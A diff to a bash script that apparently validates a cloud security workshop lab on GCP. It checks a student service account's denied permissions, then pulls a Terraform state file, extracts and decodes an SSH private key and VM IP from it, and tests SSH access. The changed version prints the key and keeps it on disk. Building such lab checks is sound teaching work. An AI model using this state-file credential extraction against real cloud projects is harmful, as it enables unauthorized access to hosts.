@@ -29,57 +29,39 @@ for tool in gcloud gsutil jq ssh base64; do
 done
 echo -e "${GREEN}✓ All required tools are installed${NC}"
 
-# Save original gcloud configuration
-echo -e "\n${YELLOW}[2/8] Validating student-workshop configuration...${NC}"
+# Check we're using validation configuration
+echo -e "\n${YELLOW}[2/8] Checking gcloud configuration...${NC}"
 
-# Save current configuration details
-ORIGINAL_CONFIG=$(gcloud config configurations list --filter="is_active=true" --format="value(name)")
-ORIGINAL_ACCOUNT=$(gcloud auth list --filter="status:ACTIVE" --format="value(account)")
-ORIGINAL_PROJECT=$(gcloud config get-value project)
-
-# Set up trap to restore original configuration on exit
-restore_config() {
-    if [ -n "$ORIGINAL_CONFIG" ]; then
-        gcloud config configurations activate "$ORIGINAL_CONFIG"
-        if [ $? -ne 0 ]; then
-            echo "Warning: Failed to restore config, but continuing"
-        fi
-    fi
-}
-trap "restore_config; rm -rf $TEMP_DIR" EXIT
-
-echo -e "${GREEN}✓ Saved original gcloud configuration: $ORIGINAL_CONFIG${NC}"
-
-# Check that student-workshop configuration exists
-gcloud config configurations list --format="value(name)" | grep -q "^student-workshop$"
-if [ $? -ne 0 ]; then
-    echo -e "${RED}✗ ERROR: student-workshop configuration does not exist${NC}"
-    echo "Please create it with: gcloud config configurations create student-workshop"
-    echo "Then activate the student-workshop service account"
+CURRENT_CONFIG=$(gcloud config configurations list --filter="is_active=true" --format="value(name)")
+if [ "$CURRENT_CONFIG" != "validation" ]; then
+    echo -e "${RED}✗ ERROR: Not using validation configuration${NC}"
+    echo "Current config: $CURRENT_CONFIG"
+    echo "Please run: gcloud config configurations activate validation"
     exit 1
 fi
-echo -e "${GREEN}✓ student-workshop configuration exists${NC}"
+echo -e "${GREEN}✓ Using validation configuration${NC}"
+
+# Create shared validation test directory
+VAL_TEST_DIR="./val-test"
+mkdir -p "$VAL_TEST_DIR"
+echo -e "${GREEN}✓ Created/using validation test directory: $VAL_TEST_DIR${NC}"
 
 # Test student-workshop account restrictions
 echo -e "\n${YELLOW}[3/8] Testing student-workshop permissions...${NC}"
 
-# Switch to student-workshop configuration
-gcloud config configurations activate student-workshop
-if [ $? -ne 0 ]; then
-    echo -e "${RED}✗ ERROR: Failed to activate student-workshop configuration${NC}"
-    exit 1
-fi
+# Get current service account
+STUDENT_ACCOUNT="student-workshop@$PROJECT_ID.iam.gserviceaccount.com"
 
 # Test 1: Verify student-workshop CANNOT access file-uploads bucket
 BUCKET_NAME="gs://file-uploads-$PROJECT_ID"
-if gsutil ls "$BUCKET_NAME" 2>&1 | grep -q "AccessDeniedException\|403"; then
+if gsutil -i "$STUDENT_ACCOUNT" ls "$BUCKET_NAME" 2>&1 | grep -q "AccessDeniedException\|403"; then
     echo -e "${GREEN}✓ student-workshop correctly denied access to $BUCKET_NAME${NC}"
-elif gsutil ls "$BUCKET_NAME"; then
+elif gsutil -i "$STUDENT_ACCOUNT" ls "$BUCKET_NAME"; then
     echo -e "${RED}✗ ERROR: student-workshop has access to $BUCKET_NAME (should be denied)${NC}"
     exit 1
 else
     # Check if it's a different error (e.g., bucket doesn't exist)
-    ERROR_MSG=$(gsutil ls "$BUCKET_NAME" 2>&1)
+    ERROR_MSG=$(gsutil -i "$STUDENT_ACCOUNT" ls "$BUCKET_NAME" 2>&1)
     if echo "$ERROR_MSG" | grep -q "BucketNotFoundException\|404"; then
         echo -e "${YELLOW}⚠ WARNING: Bucket $BUCKET_NAME not found - may need to run setup first${NC}"
     else
@@ -87,38 +69,21 @@ else
     fi
 fi
 
-# Test 2: Verify student-workshop CANNOT list compute instances
-if gcloud compute instances list --project="$PROJECT_ID" 2>&1 | grep -q "Required 'compute.instances.list' permission\|403\|Permission\|does not have compute.instances.list"; then
+# Test 2: Verify student-workshop CANNOT list compute instances  
+if gcloud compute instances list --impersonate-service-account="$STUDENT_ACCOUNT" --project="$PROJECT_ID" 2>&1 | grep -q "Required 'compute.instances.list' permission\|403\|Permission\|does not have compute.instances.list"; then
     echo -e "${GREEN}✓ student-workshop correctly denied compute instance listing${NC}"
-elif gcloud compute instances list --project="$PROJECT_ID"; then
+elif gcloud compute instances list --impersonate-service-account="$STUDENT_ACCOUNT" --project="$PROJECT_ID"; then
     echo -e "${RED}✗ ERROR: student-workshop can list compute instances (should be denied)${NC}"
     exit 1
 else
     echo -e "${GREEN}✓ student-workshop correctly denied compute instance listing${NC}"
 fi
 
-# Switch to admin-backup for remaining tests
-echo -e "${GREEN}✓ Switching to admin-backup configuration for remaining tests${NC}"
-gcloud config configurations activate admin-backup
-if [ $? -ne 0 ]; then
-    echo -e "${YELLOW}⚠ WARNING: admin-backup configuration not found, using original: $ORIGINAL_CONFIG${NC}"
-    gcloud config configurations activate "$ORIGINAL_CONFIG"
-    if [ $? -ne 0 ]; then
-        echo "Warning: Failed to restore config, but continuing"
-    fi
-fi
-
-# Create temporary directory
-TEMP_DIR=$(mktemp -d)
-# Update trap to include restore_config
-trap "restore_config; rm -rf $TEMP_DIR" EXIT
-echo -e "${GREEN}✓ Created temporary directory: $TEMP_DIR${NC}"
-
-# Check bucket exists and download state file
+# Check bucket exists and download state file (using current account)
 echo -e "\n${YELLOW}[4/8] Validating storage bucket and state file...${NC}"
 
 BUCKET_NAME="gs://file-uploads-$PROJECT_ID"
-STATE_FILE="$TEMP_DIR/terraform.tfstate"
+STATE_FILE="$VAL_TEST_DIR/terraform.tfstate"
 
 gsutil ls "$BUCKET_NAME"
 if [ $? -ne 0 ]; then
@@ -147,28 +112,32 @@ echo -e "${GREEN}✓ State file is valid JSON${NC}"
 echo -e "\n${YELLOW}[5/8] Extracting exploit components from state file...${NC}"
 
 # Find the SSH secret in the state file
-SSH_KEY_B64=$(jq -r '.resources[] | select(.type=="google_secret_manager_secret_version" and .name=="ssh-secret-version-module2") | .instances[0].attributes.secret_data' "$STATE_FILE" 2>/dev/null)
+SSH_KEY_B64=$(jq -r '.resources[] | select(.type=="google_secret_manager_secret_version" and .name=="ssh-secret-version-module2") | .instances[0].attributes.secret_data' "$STATE_FILE" )
 
 if [ -z "$SSH_KEY_B64" ] || [ "$SSH_KEY_B64" == "null" ]; then
     echo -e "${RED}✗ ERROR: Could not find SSH key in state file${NC}"
     exit 1
 fi
-echo -e "${GREEN}✓ Found base64-encoded SSH key in state file${NC}"
+echo -e "${GREEN}✓ Found base64-encoded SSH key in state file: \n${SSH_KEY_B64}${NC}"
 
 # Decode SSH key
-SSH_KEY_FILE="$TEMP_DIR/ssh_key"
+SSH_KEY_FILE="$VAL_TEST_DIR/ssh_key"
 echo "$SSH_KEY_B64" | base64 -d > "$SSH_KEY_FILE"
 chmod 600 "$SSH_KEY_FILE"
-echo -e "${GREEN}✓ Decoded SSH key and saved with proper permissions${NC}"
+echo -e "${GREEN}✓ Decoded SSH key and saved with proper permissions: \n ${SSH_KEY_FILE}${NC}"
 
 # Extract VM external IP
-VM_IP=$(jq -r '.resources[] | select(.type=="google_compute_instance" and .name=="compute-instance-module2") | .instances[0].attributes.network_interface[0].access_config[0].nat_ip' "$STATE_FILE" 2>/dev/null)
+VM_IP=$(jq -r '.resources[] | select(.type=="google_compute_instance" and .name=="compute-instance-module2") | .instances[0].attributes.network_interface[0].access_config[0].nat_ip' "$STATE_FILE" )
 
 if [ -z "$VM_IP" ] || [ "$VM_IP" == "null" ]; then
     echo -e "${RED}✗ ERROR: Could not find VM external IP in state file${NC}"
     exit 1
 fi
 echo -e "${GREEN}✓ Found VM external IP: $VM_IP${NC}"
+
+# Save VM IP for Module 3
+echo "$VM_IP" > "$VAL_TEST_DIR/vm_ip.txt"
+echo -e "${GREEN}✓ Saved VM IP to $VAL_TEST_DIR/vm_ip.txt for Module 3${NC}"
 
 # Test SSH connectivity
 echo -e "\n${YELLOW}[6/8] Testing SSH connectivity...${NC}"
